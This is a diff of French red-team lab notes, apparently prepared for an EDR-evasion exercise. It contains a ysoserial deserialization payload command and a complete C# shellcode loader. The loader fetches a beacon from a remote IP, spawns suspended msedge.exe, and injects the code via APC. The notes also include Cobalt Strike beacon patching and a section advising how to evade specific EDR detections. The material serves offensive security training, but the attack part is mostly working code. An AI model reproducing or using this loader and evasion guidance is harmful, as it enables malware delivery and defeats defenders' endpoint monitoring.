@@ -1,9 +1,10 @@
 # Initial access
 
 ```
-.\ysoserial.exe -g DataSetOldBehaviourFromFile -f BinaryFormatter -c "ExploitClass.cs;System.dll" -o raw --minify --spoofedAssembly=mscorlib --outputpath=C:\Payloads\data.bin
+.\ysoserial.exe -g DataSetOldBehaviourFromFile -f BinaryFormatter -c "ExploitClass.cs;System.dll" -o raw --minify --spoofedAssembly=mscorlib --outputpath=C:\Temp\data.bin
 ```
 
+Classic process injection
 ```cs
 using System;
 using System.Runtime.InteropServices;
@@ -29,6 +30,122 @@ class ExploitClass
         Marshal.Copy(shellcode, 0, addr, shellcode.Length);
         CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
         System.Threading.Thread.Sleep(10000);
+    }
+}
+```
+
+https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-3/
+```cs
+using System;
+using System.Runtime.InteropServices;
+using System.Net;
+
+class ExploitClass
+{
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtectEx(IntPtr handle, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    public struct STARTUPINFO
+    {
+    public Int32 cb;
+    public string lpReserved;
+    public string lpDesktop;
+    public string lpTitle;
+    public Int32 dwX;
+    public Int32 dwY;
+    public Int32 dwXSize;
+    public Int32 dwYSize;
+    public Int32 dwXCountChars;
+    public Int32 dwYCountChars;
+    public Int32 dwFillAttribute;
+    public Int32 dwFlags;
+    public Int16 wShowWindow;
+    public Int16 cbReserved2;
+    public IntPtr lpReserved2;
+    public IntPtr hStdInput;
+    public IntPtr hStdOutput;
+    public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+    public IntPtr hProcess;
+    public IntPtr hThread;
+    public int dwProcessId;
+    public int dwThreadId;
+    }
+
+    public static class CreationFlags
+    {
+    public const uint SUSPENDED = 0x4;
+    }
+
+    public enum ThreadAccess : int
+    {
+    SET_CONTEXT = 0x0010
+    }
+
+    public static readonly UInt32 MEM_COMMIT = 0x1000;
+    public static readonly UInt32 MEM_RESERVE = 0x2000;
+    public static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
+    public static readonly UInt32 PAGE_READWRITE = 0x04;
+
+    public ExploitClass() {
+        // Shellcode download
+        string url = "http://192.168.254.1/agent.x64.bin";
+        WebClient wc = new WebClient();
+        byte[] buf = wc.DownloadData(url);
+        if (buf == null || buf.Length == 0) return;
+
+        // Creation process
+        STARTUPINFO si = new STARTUPINFO();
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        string app = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe --no-sandbox --no-startup-window --type=gpu-process";
+        bool procinit = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
+        if (!procinit) return;
+
+        // Réservation mémoire RW, de taille shellcode.Length
+        IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (resultPtr == IntPtr.Zero) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
+
+        // Ecriture du shellcode dans la zone mémoire
+        IntPtr bytesWritten = IntPtr.Zero;
+        bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);
+        if (!resultBool) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
+
+        // Passage de la zone mémoire de RW à RX
+        uint oldProtect = 0;
+        IntPtr proc_handle = pi.hProcess;
+        resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);
+        if (!resultBool) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
+
+        IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
+
+        IntPtr ThreadHandle = pi.hThread;
+        ResumeThread(ThreadHandle);
+
+        CloseHandle(ThreadHandle);
+        CloseHandle(pi.hProcess);
     }
 }
 ```
@@ -210,13 +327,13 @@ The beacons of these listeners don’t need to talk to the C2 directly, they can
 # NextSteps
 
 - [ ] Tester avec full Crystal-Kit last version github sur les labs
-- [ ] Faire un nouveau shellcode runner (process hollowing ou APC en .NET), le tester en condition réelle sur la VM avec service csvc.exe et ysoserial
+- [x] Faire un nouveau shellcode runner (process hollowing ou APC en .NET), le tester en condition réelle sur la VM avec service csvc.exe et ysoserial
 - [x] Tester dans le lab les exploits mssql avec beacon smb/tcp listener avec connect/link
-- [ ] Relire les 4 points perdus et chercher ce qui a pu causer ces erreurs
+- [x] Relire les 4 points perdus et chercher ce qui a pu causer ces erreurs
 
 # Notes
 
-- `execute-assembly` -> BYOWD
+- `execute-assembly` -> BYOVD
 - Beacon smb/tcp -> link/connect
 
 
@@ -234,3 +351,17 @@ $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8
 ```
 
 - Load `C:\Tools\Crystal-Kit-main\crystalkit.cna`
+
+# Feedback score
+
+**Cobalt Strike in memory** — Tes chaînes caractéristiques du beacon (named pipes, commandes, metadata) sont probablement restées en clair en mémoire. Le feedback le confirme : il te manque du string replacement dans le profil Malleable C2 et une technique de sleep obfuscation (sleep mask kit ou équivalent) pour chiffrer le beacon entre les callbacks.
+> Revoir Crystal-Kit
+
+**Network Module Loaded from Suspicious Unbacked Memory** — Ton beacon charge des DLL réseau (wininet.dll, winhttp.dll, ws2_32.dll) depuis une région mémoire non mappée à un fichier sur disque. C'est typique d'un shellcode injecté en RWX sans backing. Il faut soit utiliser du module stomping, soit charger le beacon dans une région mémoire backed par un fichier légitime.
+> ?
+
+**Remote Thread Context Manipulation** — Tu utilises probablement une injection par manipulation de contexte de thread (GetThreadContext/SetThreadContext ou NtContinue) dans un processus distant. L'EDR surveille ces appels croisés entre processus. Il faut envisager des techniques d'exécution qui évitent la manipulation directe du contexte d'un thread remote (callbacks via APC dans le même processus, threadless injection, etc.).
+> Améliorer l'initial loader C#
+
+**Spawned Processes (suspended)** — Tu lances des processus en état suspendu (CREATE_SUSPENDED) pour y injecter, ce qui est le fork&run classique de Cobalt Strike. L'EDR détecte la combinaison création suspendue + injection. Il faut passer en mode inline (BOF) autant que possible et, quand le fork&run est inévitable, utiliser des processus cohérents avec le contexte utilisateur et éviter l'état suspendu explicite.
+> Ne pas utiliser `execute-assembly`, si absolument besoin patch etw-ti avec BYOVD
